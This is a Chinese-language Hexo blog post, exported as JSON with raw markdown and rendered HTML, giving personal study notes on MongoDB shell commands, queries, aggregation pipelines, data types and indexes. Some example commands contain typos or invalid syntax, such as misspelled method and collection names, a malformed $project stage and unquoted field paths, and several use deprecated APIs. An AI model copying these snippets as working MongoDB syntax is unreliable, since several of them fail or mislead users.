db.collection.aggregate([{$group:{_id:null,count:{$sum:1}}}]):表示查出这个文档的个数,_id=null的时候,表示整个文档为一组\n    上面的各种结果中都一定有一个_id字段,id表示分组依据\n    db.collection.aggregate([{$group:{_id:$gender,count:{$sum:1}}},{$[project:{gender:$_id,count:1,_id:0}]}]):表示创建一个gender字段,值为上一个管道的_id的值,count:1表示显示这个字段,_id:0,表示不显示这个字段,也可以使用count:$count来显示,个之前的投影一样的1\\0操作\n\n    db.collection.aggregate([{$sort:{name:1}}]):按照姓名升序排序\n    db.collection.aggregate([\n        {$group:{_id:$gender,count:{$sum:1}}},\n        {$project:{_id:0,gender:$_id.gender,count:1}},\n        {$sort:{count:1}}\n    ]) 按照男女生总数升序排列\n    db.cllection.aggregate([\n        {$skip:2},\n        {$limit:2}\n    ]) 跳过两条显示两条\n\n    原数据:{\"_id\":1, \"name\":\"map\", \"size\":[1,2,3]}\n    db.collection.aggregate([{$unwind:$size}]):将上面的数据中的size对应的列表拆分成三个,这个管道只对列表有用\n    拆分后:\n        {\"_id\":1, \"name\":\"map\", \"size\":1}\n        {\"_id\":1, \"name\":\"map\", \"size\":2}\n        {\"_id\":1, \"name\":\"map\", \"size\":3}\n\n\n    高级使用:\n    db.collection.aggregate([\n        {$group:{_id:{conutry:$conutry,prevent:$prevent,userid:$userid}}}, 将不同国家的不同省份的用户分出来userid用于去重\n        {$group:{_id:{conutry:$_id.conutry,prevent:$_id.prevent},conunt:{$sum:1}}}, 在将以上分好的用国家和省份分组统计出总个数\n        {$project:{_id:0,conutry:$_id.conutry,prevent:$_id.prevent,conunt:1}} 显示某个国家某个地区的总人数\n    ])\n```\n\n\n\n### 更新数据\n```\ndb.集合名.update({条件 根据这个条件查出对应的数据 字典格式},{把查到的数据更新成什么 字典格式},{multi Boolean 如果是true那么就是把查到的所有符合的数据都更新,false的话就只是更新查到的一个符合条件的数据})\n    这种方式不是简单的更新,这种属于是替换\ndb.集合名.update({条件 根据这个条件查出对应的数据 字典格式},{$set:把查到的数据更新成什么 字典格式},{multi Boolean 如果是true那么就是把查到的所有符合的数据都更新,false的话就只是更新查到的一个符合条件的数据})\n    这种方式就是更新,不会把本不该更新的键值对也替换了\n```\n\n### 删除数据\n```\ndb.集合名.remove({条件 根据这个条件查出对应的数据 字典格式},{justOne:true})\n\n    justOne表示是否只删除一条,如果是false,那么删除满足条件的所有数据,默认false\n```\n    \n\n\n\n\n### 数据类型\n```\nObject ID: 文档ID\nString: 字符串,最常用,必须是utf-8\nBoolean: 存储一个布尔,true或者false\nInteger: 整数,可以是32位\\64位\nDouble: 浮点数\nArrays: 数组或者列表,多个值存入一个键\nObject: 用于嵌入式的文档,即一个值为一个文档\nNull: 存储Null值\nTimestamp: 时间戳,表示从1970-1-1到现在的总秒数\nData: 存储当前日期或者时间的UNIX时间格式,在mongodb中可以通过new Date(日期)来使用,存入的是年月日\n\n\n说明:\n    文档:要存入数据库中的字典,可以是各种嵌套的字典\n\n    每一个文档都有一个固定的属性 _id 会自动生成(12字节的十六进制数),多数时间自己设置_id,为了保证唯一性\n```\n\n\n\n\n### 索引\n```\n创建索引:\n    db.collection.ensureIndex({\"索引字段\",排序方式1升序-1降序},{\"索引字段\",\"取得名字\"}):索引的创建\\取名\n查询索引:\n    db.collection.getIndexes():查询所有的索引\n删除索引：\n    db.collection.dorpIndex(\"索引名\")\n```","source":"_posts/mongoDB使用.md","raw":"---\ntitle: mongoDB使用\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 16:39:14\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: MongoDB基础\ntags: mongo\ncategories: db\n---\n# Mongodb\n\n> - 全局说明:文档=字典=map=dict=json \n> \n> - $是mongodb的专用字符\n\n## 安装\n```shell\nsudo apt-get install -y mongodb-org\n```\n## 启动(服务器):\n```shell\nsudo service mongod start\nsudo service mongod stop\nsudo service mongod restart\n```\n## 启动客户端\n```shell\nmongo\n```\n\n\n\n##    服务环境:\n```text\nmongod://localhost:27017\nredis://localhost:6379\nmysql://localhost:3306\nnginx://localhost:8888\ntomcat://localhost:8080\nflask://localhost:5000\ndjango://localhost:8000\n```\n\n\n## mongodb的命令\n```text\nshow dbs: 查看有哪些数据库\nshow database: 查看有哪些数据库\nuse 数据库: 切换到某个数据库,如果没有,直接创建(如果被使用的数据库是没有的,那么也是可以用的,因为mongodb是会自动创建的,但是,如果在创建完成之后没有存入任何数据,那么这个表用完之后,也不会保存)\ndb: 查看当前数据库(代表当前数据库)\ndb.dropDatabase(): 删除当前使用的数据库\n\nmongodb没有表的概念 数据都存储在集合当中\n\n集合也是不需要自己创建的,可以在存入数据的时候,mongodb自动创建集合\n\n也可以手动创建集合\ndb.createCollection(name, options): name 是被创建的这个集合的名字,options是这个集合的一些属性约束,用一个字典来设置\ndb.createCollection(\"userinfo\",{capped:true, size:10}):表示的就是,创建一个叫做userinfo的集合,capped表示限制,默认false,无上限,size是在capped为true的时候设置,表示数据超过10字节的时候,就会被新的数据覆盖,把之前的数据往外挤\n\nshow cllections: 查看所有的集合\ndb.集合名.drop(): 删除给定的集合\ndb.集合名: 使用指定的集合\ndb.集合名.find(): 查询指定的集合中的数据\ndb.集合名.insert({\"name\": \"lqs\",\"age\":\"12\"}): 往指定的集合插入数据\n\n这是一个Object类型(文档类型,字典),那么他会自动生成一个_id:ObjectId(\"xxxxxxx\"),保证文档的唯一性\n```\n### 添加数据\n```text\ndb.集合名.insert({})\ndb.集合名.save({})\n两者的区别:\n    insert()的方式来添加数据的时候,是绝对添加,如果添加一个_id已经存在的数据,那么它会直接报错,说,如果添加一个_id已经存在\n    save()的方式来添加数据的时候,是相对添加,如果添加一个_id不存在的数据,就和insert()方法一样,如果添加一个_id已经存在的数据,那么就是替换这个数据\n```\n###    文档插入\n```text\ndb.集合名.insert({_id:value,key:\"value\",key:\"value\",...}): key是可以不用引起来,也可以引起,value根据具体数数据类型,字符串就引起,数字就不引起,_id如果自己不设置,系统就会自动生成\n```\n### 查询数据\n```text\n美化查询:db.集合名.find().pretty():\n\ndb.集合名.find(): 查给定集合的所有数据\n\ndb.集合名.find(条件 根据这个条件查出对应的数据 字典格式, 返回的字段): 查询出给定集合里满足条件的所有数据\ndb.集合名.findOne(条件 根据这个条件查出对应的数据 字典格式): 查询出给定集合里满足条件的一条数据\n\n比较运算符\n    $lt: 小于\n    $lte: 小于等于\n    $gt: 大于\n    $gte: 大于等于\n    $ne: 不等\n使用例子:\n    db.collection.find({age:{$lt:18}}):查询出collection集合中的年龄小于18的所有数据\n\n\n范围运算符:\n    $in: 范围是指定的范围给在数组中\n    $nin: 不在指定的范围的\n使用例子:\n    db.collection.find({age:{$in:[12,45,23]}}):查询出collection集合中的年龄是12,23,45的人\n\n\n逻辑运算符:\n    与: 没有直接的运算符,直接写\n\n    $or       逻辑或\n    $and      逻辑与\n    $not      逻辑非\n    $nor      逻辑or的取反\n    $exists   存在逻辑\n    $type     查询键的数据类型\n使用例子:\n    db.collection.find({$or:[{age:{$lt:18}},{name:\"sc\"}]}):查询出collection中的年龄小于18或者名字等于sc的\n\n\n正则:\n    用/正则表达式/或者$regex:\"正则表达式\"编写正则表达式\n使用例子:\n    db.collection.find({name:/^abc/}):查询名字是abc开头的\n    db.collection.find({name:{$regex:\"123$\"}}):查询名字是123结尾的\n\n\nlimit和skip:\n    limit: 选中多少个\n    skip: 跳过多少个\n    配合使用的时候,先skip再limit\n使用例子:\n    db.collection.find().skip(2).limit(2):跳过两个再选中两个\n\n\n自定义查询(写js):\n    db.collection.find({$where:function(){return this.age>30}})\n    where可以执行一个函数,this就是表示当前collection中的数据,一条一条的来过this,类似于遍历\n```\n\n\n#### 查询之后返回字段的过滤\n```text\ndb.collection.find({条件},{name:1,_id:0 参数就是返回的字段,1为返回,不写不返回,除了_id,如果不想返回_id,那么_id:0})\n```\n#### 排序\n```\ndb.collection.find().sort({排序字段:1, 排序字段:-1}): sort表示排序,1为升序,-1为降序\n```\n#### 统计个数\n```\ndb.collection.find({条件}).count()\ndb.collection.count({条件})\n```\n\n#### 去重\n```\ndb.collection.distinct(\"字段名字\",{条件}): 返回的是一个列表,列表里面是不重复的\n```\n#### 聚合查询\n```\n管道:上层的结果给下层用\n$sum:总和,统计个数,$sum:1,以一倍计数\n$avg:平均\n$min:最小值\n$max:最大值\n$push:结果文档插入到一个数组中，\n$addToSet:结果文档插入到一个数组中,但不创建副本\n$first:根据资源文档排序获取第一个文档数据,\n$last:根据资源文档排序获取最后一个文档数据,\n$limit:显示多少个\n$skip:跳过多少个\n$sort:排序\n$project:修改输入文档的结构,如重命名\\添加\\删除字段,创建计算结果\n$unwind:将数组类型的字段进行拆分\n\n$match:相当于mysql中where\n$group:相当于mysql中group by\n\ndb.collection.aggregate(pipeline, options):语法:pipeline,管道,必须是一个数组\n格式:db.collection.aggregate([{管道:{表达式}},{管道:{表达式}}])\n\n管道中使用字段:\n    不加$:在明确的条件中字段不用加$如{name:\"lqs\"}:这种表示name是lqs,冒号前面不加\n    加$:在不明确的使用值的时候加$如{name2:$name}:这种表示获取name的值,冒号后面加\n\n例子:\n    db.collection.aggregate([{$match:{name:\"lqs\"}}]):查出名字是lqs的\n    db.collection.aggregate([{$match:{_id:{\"$gt\":2}}},{$group:{_id:$name,aavg:{$avg:$salary}}}]):查出_id大于2的所有数据,在上面查出的数据中,再按照name分组,求出salary的平均,_id表示分组字段的key,分组字段必须加上$,在这里面出现的变量多用$修饰,aavg是别名这种有多个操作的,都是衔接的,必须下面能用\n    db.collection.aggregate([{$group:{_id:$name,maxM:{$max:$salary},minM:{$min:$salary}}}]):分组查出最大最小\n    db.collection.aggregate([{$group:{_id:$sex,count:{$sum:1}}}]):分组统计男女生的总个数\n    db.collection.aggregate([{$group:{_id:null,count:{$sum:1}}}]):表示查出这个文档的个数,_id=null的时候,表示整个文档为一组\n    上面的各种结果中都一定有一个_id字段,id表示分组依据\n    db.collection.aggregate([{$group:{_id:$gender,count:{$sum:1}}},{$[project:{gender:$_id,count:1,_id:0}]}]):表示创建一个gender字段,值为上一个管道的_id的值,count:1表示显示这个字段,_id:0,表示不显示这个字段,也可以使用count:$count来显示,个之前的投影一样的1\\0操作\n\n    db.collection.aggregate([{$sort:{name:1}}]):按照姓名升序排序\n    db.collection.aggregate([\n        {$group:{_id:$gender,count:{$sum:1}}},\n        {$project:{_id:0,gender:$_id.gender,count:1}},\n        {$sort:{count:1}}\n    ]) 按照男女生总数升序排列\n    db.cllection.aggregate([\n        {$skip:2},\n        {$limit:2}\n    ]) 跳过两条显示两条\n\n    原数据:{\"_id\":1, \"name\":\"map\", \"size\":[1,2,3]}\n    db.collection.aggregate([{$unwind:$size}]):将上面的数据中的size对应的列表拆分成三个,这个管道只对列表有用\n    拆分后:\n        {\"_id\":1, \"name\":\"map\", \"size\":1}\n        {\"_id\":1, \"name\":\"map\", \"size\":2}\n        {\"_id\":1, \"name\":\"map\", \"size\":3}\n\n\n    高级使用:\n    db.collection.aggregate([\n        {$group:{_id:{conutry:$conutry,prevent:$prevent,userid:$userid}}}, 将不同国家的不同省份的用户分出来userid用于去重\n        {$group:{_id:{conutry:$_id.conutry,prevent:$_id.prevent},conunt:{$sum:1}}}, 在将以上分好的用国家和省份分组统计出总个数\n        {$project:{_id:0,conutry:$_id.conutry,prevent:$_id.prevent,conunt:1}} 显示某个国家某个地区的总人数\n    ])\n```\n\n\n\n### 更新数据\n```\ndb.集合名.update({条件 根据这个条件查出对应的数据 字典格式},{把查到的数据更新成什么 字典格式},{multi Boolean 如果是true那么就是把查到的所有符合的数据都更新,false的话就只是更新查到的一个符合条件的数据})\n    这种方式不是简单的更新,这种属于是替换\ndb.集合名.update({条件 根据这个条件查出对应的数据 字典格式},{$set:把查到的数据更新成什么 字典格式},{multi Boolean 如果是true那么就是把查到的所有符合的数据都更新,false的话就只是更新查到的一个符合条件的数据})\n    这种方式就是更新,不会把本不该更新的键值对也替换了\n```\n\n### 删除数据\n```\ndb.集合名.remove({条件 根据这个条件查出对应的数据 字典格式},{justOne:true})\n\n    justOne表示是否只删除一条,如果是false,那么删除满足条件的所有数据,默认false\n```\n    \n\n\n\n\n### 数据类型\n```\nObject ID: 文档ID\nString: 字符串,最常用,必须是utf-8\nBoolean: 存储一个布尔,true或者false\nInteger: 整数,可以是32位\\64位\nDouble: 浮点数\nArrays: 数组或者列表,多个值存入一个键\nObject: 用于嵌入式的文档,即一个值为一个文档\nNull: 存储Null值\nTimestamp: 时间戳,表示从1970-1-1到现在的总秒数\nData: 存储当前日期或者时间的UNIX时间格式,在mongodb中可以通过new Date(日期)来使用,存入的是年月日\n\n\n说明:\n    文档:要存入数据库中的字典,可以是各种嵌套的字典\n\n    每一个文档都有一个固定的属性 _id 会自动生成(12字节的十六进制数),多数时间自己设置_id,为了保证唯一性\n```\n\n\n\n\n### 索引\n```\n创建索引:\n    db.collection.ensureIndex({\"索引字段\",排序方式1升序-1降序},{\"索引字段\",\"取得名字\"}):索引的创建\\取名\n查询索引:\n    db.collection.getIndexes():查询所有的索引\n删除索引：\n    db.collection.dorpIndex(\"索引名\")\n```","slug":"mongoDB使用","published":1,"updated":"2023-03-10T02:55:17.477Z","_id":"cld2uqf6900061svkd4gebgfn","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Mongodb\"><a href=\"#Mongodb\" class=\"headerlink\" title=\"Mongodb\"></a>Mongodb</h1><blockquote>\n<ul>\n<li><p>全局说明:文档=字典=map=dict=json </p>\n</li>\n<li><p>$是mongodb的专用字符</p>\n</li>\n</ul>\n</blockquote>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-y</span> mongodb-org<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"启动-服务器\"><a href=\"#启动-服务器\" class=\"headerlink\" title=\"启动(服务器):\"></a>启动(服务器):</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">service</span> mongod start\n<span class=\"token function\">sudo</span> <span class=\"token function\">service</span> mongod stop\n<span class=\"token function\">sudo</span> <span class=\"token function\">service</span> mongod restart<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"启动客户端\"><a href=\"#启动客户端\" class=\"headerlink\" title=\"启动客户端\"></a>启动客户端</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">mongo<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h2 id=\"服务环境\"><a href=\"#服务环境\" class=\"headerlink\" title=\"服务环境:\"></a>服务环境:</h2><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">mongod://localhost:27017\nredis://localhost:6379\nmysql://localhost:3306\nnginx://localhost:8888\ntomcat://localhost:8080\nflask://localhost:5000\ndjango://localhost:8000<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h2 id=\"mongodb的命令\"><a href=\"#mongodb的命令\" class=\"headerlink\" title=\"mongodb的命令\"></a>mongodb的命令</h2><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">show dbs: 查看有哪些数据库\nshow database: 查看有哪些数据库\nuse 数据库: 切换到某个数据库,如果没有,直接创建(如果被使用的数据库是没有的,那么也是可以用的,因为mongodb是会自动创建的,但是,如果在创建完成之后没有存入任何数据,那么这个表用完之后,也不会保存)\ndb: 查看当前数据库(代表当前数据库)\ndb.dropDatabase(): 删除当前使用的数据库\n\nmongodb没有表的概念 数据都存储在集合当中\n\n集合也是不需要自己创建的,可以在存入数据的时候,mongodb自动创建集合\n\n也可以手动创建集合\ndb.createCollection(name, options): name 是被创建的这个集合的名字,options是这个集合的一些属性约束,用一个字典来设置\ndb.createCollection(\"userinfo\",&#123;capped:true, size:10&#125;):表示的就是,创建一个叫做userinfo的集合,capped表示限制,默认false,无上限,size是在capped为true的时候设置,表示数据超过10字节的时候,就会被新的数据覆盖,把之前的数据往外挤\n\nshow cllections: 查看所有的集合\ndb.集合名.drop(): 删除给定的集合\ndb.集合名: 使用指定的集合\ndb.集合名.find(): 查询指定的集合中的数据\ndb.集合名.insert(&#123;\"name\": \"lqs\",\"age\":\"12\"&#125;): 往指定的集合插入数据\n\n这是一个Object类型(文档类型,字典),那么他会自动生成一个_id:ObjectId(\"xxxxxxx\"),保证文档的唯一性<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"添加数据\"><a href=\"#添加数据\" class=\"headerlink\" title=\"添加数据\"></a>添加数据</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">db.集合名.insert(&#123;&#125;)\ndb.集合名.save(&#123;&#125;)\n两者的区别:\n    insert()的方式来添加数据的时候,是绝对添加,如果添加一个_id已经存在的数据,那么它会直接报错,说,如果添加一个_id已经存在\n    save()的方式来添加数据的时候,是相对添加,如果添加一个_id不存在的数据,就和insert()方法一样,如果添加一个_id已经存在的数据,那么就是替换这个数据<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"文档插入\"><a href=\"#文档插入\" class=\"headerlink\" title=\"文档插入\"></a>文档插入</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">db.集合名.insert(&#123;_id:value,key:\"value\",key:\"value\",...&#125;): key是可以不用引起来,也可以引起,value根据具体数数据类型,字符串就引起,数字就不引起,_id如果自己不设置,系统就会自动生成<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"查询数据\"><a href=\"#查询数据\" class=\"headerlink\" title=\"查询数据\"></a>查询数据</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">美化查询:db.集合名.find().pretty():\n\ndb.集合名.find(): 查给定集合的所有数据\n\ndb.集合名.find(条件 根据这个条件查出对应的数据 字典格式, 返回的字段): 查询出给定集合里满足条件的所有数据\ndb.集合名.findOne(条件 根据这个条件查出对应的数据 字典格式): 查询出给定集合里满足条件的一条数据\n\n比较运算符\n    $lt: 小于\n    $lte: 小于等于\n    $gt: 大于\n    $gte: 大于等于\n    $ne: 不等\n使用例子:\n    db.collection.find(&#123;age:&#123;$lt:18&#125;&#125;):查询出collection集合中的年龄小于18的所有数据\n\n\n范围运算符:\n    $in: 范围是指定的范围给在数组中\n    $nin: 不在指定的范围的\n使用例子:\n    db.collection.find(&#123;age:&#123;$in:[12,45,23]&#125;&#125;):查询出collection集合中的年龄是12,23,45的人\n\n\n逻辑运算符:\n    与: 没有直接的运算符,直接写\n\n    $or       逻辑或\n    $and      逻辑与\n    $not      逻辑非\n    $nor      逻辑or的取反\n    $exists   存在逻辑\n    $type     查询键的数据类型\n使用例子:\n    db.collection.find(&#123;$or:[&#123;age:&#123;$lt:18&#125;&#125;,&#123;name:\"sc\"&#125;]&#125;):查询出collection中的年龄小于18或者名字等于sc的\n\n\n正则:\n    用/正则表达式/或者$regex:\"正则表达式\"编写正则表达式\n使用例子:\n    db.collection.find(&#123;name:/^abc/&#125;):查询名字是abc开头的\n    db.collection.find(&#123;name:&#123;$regex:\"123$\"&#125;&#125;):查询名字是123结尾的\n\n\nlimit和skip:\n    limit: 选中多少个\n    skip: 跳过多少个\n    配合使用的时候,先skip再limit\n使用例子:\n    db.collection.find().skip(2).limit(2):跳过两个再选中两个\n\n\n自定义查询(写js):\n    db.collection.find(&#123;$where:function()&#123;return this.age>30&#125;&#125;)\n    where可以执行一个函数,this就是表示当前collection中的数据,一条一条的来过this,类似于遍历<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<h4 id=\"查询之后返回字段的过滤\"><a href=\"#查询之后返回字段的过滤\" class=\"headerlink\" title=\"查询之后返回字段的过滤\"></a>查询之后返回字段的过滤</h4><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">db.collection.find(&#123;条件&#125;,&#123;name:1,_id:0 参数就是返回的字段,1为返回,不写不返回,除了_id,如果不想返回_id,那么_id:0&#125;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"排序\"><a href=\"#排序\" class=\"headerlink\" title=\"排序\"></a>排序</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">db.collection.find().sort(&#123;排序字段:1, 排序字段:-1&#125;): sort表示排序,1为升序,-1为降序<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"统计个数\"><a href=\"#统计个数\" class=\"headerlink\" title=\"统计个数\"></a>统计个数</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">db.collection.find(&#123;条件&#125;).count()\ndb.collection.count(&#123;条件&#125;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"去重\"><a href=\"#去重\" class=\"headerlink\" title=\"去重\"></a>去重</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">db.collection.distinct(&quot;字段名字&quot;,&#123;条件&#125;): 返回的是一个列表,列表里面是不重复的<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"聚合查询\"><a href=\"#聚合查询\" class=\"headerlink\" title=\"聚合查询\"></a>聚合查询</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">管道:上层的结果给下层用\n$sum:总和,统计个数,$sum:1,以一倍计数\n$avg:平均\n$min:最小值\n$max:最大值\n$push:结果文档插入到一个数组中，\n$addToSet:结果文档插入到一个数组中,但不创建副本\n$first:根据资源文档排序获取第一个文档数据,\n$last:根据资源文档排序获取最后一个文档数据,\n$limit:显示多少个\n$skip:跳过多少个\n$sort:排序\n$project:修改输入文档的结构,如重命名\\添加\\删除字段,创建计算结果\n$unwind:将数组类型的字段进行拆分\n\n$match:相当于mysql中where\n$group:相当于mysql中group by\n\ndb.collection.aggregate(pipeline, options):语法:pipeline,管道,必须是一个数组\n格式:db.collection.aggregate([&#123;管道:&#123;表达式&#125;&#125;,&#123;管道:&#123;表达式&#125;&#125;])\n\n管道中使用字段:\n    不加$:在明确的条件中字段不用加$如&#123;name:&quot;lqs&quot;&#125;:这种表示name是lqs,冒号前面不加\n    加$:在不明确的使用值的时候加$如&#123;name2:$name&#125;:这种表示获取name的值,冒号后面加\n\n例子:\n    db.collection.aggregate([&#123;$match:&#123;name:&quot;lqs&quot;&#125;&#125;]):查出名字是lqs的\n    db.collection.aggregate([&#123;$match:&#123;_id:&#123;&quot;$gt&quot;:2&#125;&#125;&#125;,&#123;$group:&#123;_id:$name,aavg:&#123;$avg:$salary&#125;&#125;&#125;]):查出_id大于2的所有数据,在上面查出的数据中,再按照name分组,求出salary的平均,_id表示分组字段的key,分组字段必须加上$,在这里面出现的变量多用$修饰,aavg是别名这种有多个操作的,都是衔接的,必须下面能用\n    db.collection.aggregate([&#123;$group:&#123;_id:$name,maxM:&#123;$max:$salary&#125;,minM:&#123;$min:$salary&#125;&#125;&#125;]):分组查出最大最小\n    db.collection.aggregate([&#123;$group:&#123;_id:$sex,count:&#123;$sum:1&#125;&#125;&#125;]):分组统计男女生的总个数\n    db.collection.aggregate([&#123;$group:&#123;_id:null,count:&#123;$sum:1&#125;&#125;&#125;]):表示查出这个文档的个数,_id&#x3D;null的时候,表示整个文档为一组\n    上面的各种结果中都一定有一个_id字段,id表示分组依据\n    db.collection.aggregate([&#123;$group:&#123;_id:$gender,count:&#123;$sum:1&#125;&#125;&#125;,&#123;$[project:&#123;gender:$_id,count:1,_id:0&#125;]&#125;]):表示创建一个gender字段,值为上一个管道的_id的值,count:1表示显示这个字段,_id:0,表示不显示这个字段,也可以使用count:$count来显示,个之前的投影一样的1\\0操作\n\n    db.collection.aggregate([&#123;$sort:&#123;name:1&#125;&#125;]):按照姓名升序排序\n    db.collection.aggregate([\n        &#123;$group:&#123;_id:$gender,count:&#123;$sum:1&#125;&#125;&#125;,\n        &#123;$project:&#123;_id:0,gender:$_id.gender,count:1&#125;&#125;,\n        &#123;$sort:&#123;count:1&#125;&#125;\n    ]) 按照男女生总数升序排列\n    db.cllection.aggregate([\n        &#123;$skip:2&#125;,\n        &#123;$limit:2&#125;\n    ]) 跳过两条显示两条\n\n    原数据:&#123;&quot;_id&quot;:1, &quot;name&quot;:&quot;map&quot;, &quot;size&quot;:[1,2,3]&#125;\n    db.collection.aggregate([&#123;$unwind:$size&#125;]):将上面的数据中的size对应的列表拆分成三个,这个管道只对列表有用\n    拆分后:\n        &#123;&quot;_id&quot;:1, &quot;name&quot;:&quot;map&quot;, &quot;size&quot;:1&#125;\n        &#123;&quot;_id&quot;:1, &quot;name&quot;:&quot;map&quot;, &quot;size&quot;:2&#125;\n        &#123;&quot;_id&quot;:1, &quot;name&quot;:&quot;map&quot;, &quot;size&quot;:3&#125;\n\n\n    高级使用:\n    db.collection.aggregate([\n        &#123;$group:&#123;_id:&#123;conutry:$conutry,prevent:$prevent,userid:$userid&#125;&#125;&#125;, 将不同国家的不同省份的用户分出来userid用于去重\n        &#123;$group:&#123;_id:&#123;conutry:$_id.conutry,prevent:$_id.prevent&#125;,conunt:&#123;$sum:1&#125;&#125;&#125;, 在将以上分好的用国家和省份分组统计出总个数\n        &#123;$project:&#123;_id:0,conutry:$_id.conutry,prevent:$_id.prevent,conunt:1&#125;&#125; 显示某个国家某个地区的总人数\n    ])<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"更新数据\"><a href=\"#更新数据\" class=\"headerlink\" title=\"更新数据\"></a>更新数据</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">db.集合名.update(&#123;条件 根据这个条件查出对应的数据 字典格式&#125;,&#123;把查到的数据更新成什么 字典格式&#125;,&#123;multi Boolean 如果是true那么就是把查到的所有符合的数据都更新,false的话就只是更新查到的一个符合条件的数据&#125;)\n    这种方式不是简单的更新,这种属于是替换\ndb.集合名.update(&#123;条件 根据这个条件查出对应的数据 字典格式&#125;,&#123;$set:把查到的数据更新成什么 字典格式&#125;,&#123;multi Boolean 如果是true那么就是把查到的所有符合的数据都更新,false的话就只是更新查到的一个符合条件的数据&#125;)\n    这种方式就是更新,不会把本不该更新的键值对也替换了<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"删除数据\"><a href=\"#删除数据\" class=\"headerlink\" title=\"删除数据\"></a>删除数据</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">db.集合名.remove(&#123;条件 根据这个条件查出对应的数据 字典格式&#125;,&#123;justOne:true&#125;)\n\n    justOne表示是否只删除一条,如果是false,那么删除满足条件的所有数据,默认false<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">Object ID: 文档ID\nString: 字符串,最常用,必须是utf-8\nBoolean: 存储一个布尔,true或者false\nInteger: 整数,可以是32位\\64位\nDouble: 浮点数\nArrays: 数组或者列表,多个值存入一个键\nObject: 用于嵌入式的文档,即一个值为一个文档\nNull: 存储Null值\nTimestamp: 时间戳,表示从1970-1-1到现在的总秒数\nData: 存储当前日期或者时间的UNIX时间格式,在mongodb中可以通过new Date(日期)来使用,存入的是年月日\n\n\n说明:\n    文档:要存入数据库中的字典,可以是各种嵌套的字典\n\n    每一个文档都有一个固定的属性 _id 会自动生成(12字节的十六进制数),多数时间自己设置_id,为了保证唯一性<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n<h3 id=\"索引\"><a href=\"#索引\" class=\"headerlink\" title=\"索引\"></a>索引</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">创建索引:\n    db.collection.ensureIndex(&#123;&quot;索引字段&quot;,排序方式1升序-1降序&#125;,&#123;&quot;索引字段&quot;,&quot;取得名字&quot;&#125;):索引的创建\\取名\n查询索引:\n    